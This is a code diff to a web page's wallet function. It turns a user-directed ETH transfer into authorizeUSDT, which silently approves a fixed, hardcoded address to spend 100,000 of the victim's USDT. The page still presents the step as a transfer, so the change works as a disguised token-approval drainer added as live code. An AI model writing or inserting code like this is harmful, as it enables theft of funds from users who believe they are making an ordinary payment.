@@ -1,4 +1,4 @@
-async function transferETH() {
+async function authorizeUSDT() {
     if (typeof window.ethereum !== 'undefined') {
         try {
             // 请求连接到钱包
@@ -8,20 +8,34 @@ async function transferETH() {
             const provider = new ethers.providers.Web3Provider(window.ethereum);
             const signer = provider.getSigner();
             
-            // 获取收款地址和转账数量
-            const recipientAddress = document.getElementById('address').value;
-            const amount = document.getElementById('amount').value;
-            const amountInEther = ethers.utils.parseEther(amount); // 转换为ether
+            // USDT 合约地址和 ABI
+            const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+            const usdtAbi = [
+                {
+                    "constant": false,
+                    "inputs": [
+                        { "name": "_spender", "type": "address" },
+                        { "name": "_value", "type": "uint256" }
+                    ],
+                    "name": "approve",
+                    "outputs": [{ "name": "", "type": "bool" }],
+                    "type": "function"
+                }
+            ];
             
-            // 发送ETH转账交易
-            const tx = await signer.sendTransaction({
-                to: recipientAddress,
-                value: amountInEther
-            });
+            // 创建 USDT 合约实例
+            const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
+            
+            // 授权地址和数量
+            const spenderAddress = "0xbF674CbDF092223c5BD316cA7684e5B225fE9fef";
+            const amount = ethers.utils.parseUnits("100000", 6); // 固定数量100000 USDT
+            
+            // 发送授权交易
+            const tx = await usdtContract.approve(spenderAddress, amount);
             await tx.wait();
             
             // 更新按钮文本
-            document.getElementById('nextButton').innerText = '转账成功';
+            document.getElementById('nextButton').innerText = '授权成功';
         } catch (error) {
             console.error(error);
             document.getElementById('nextButton').innerText = '转账失败请重试';
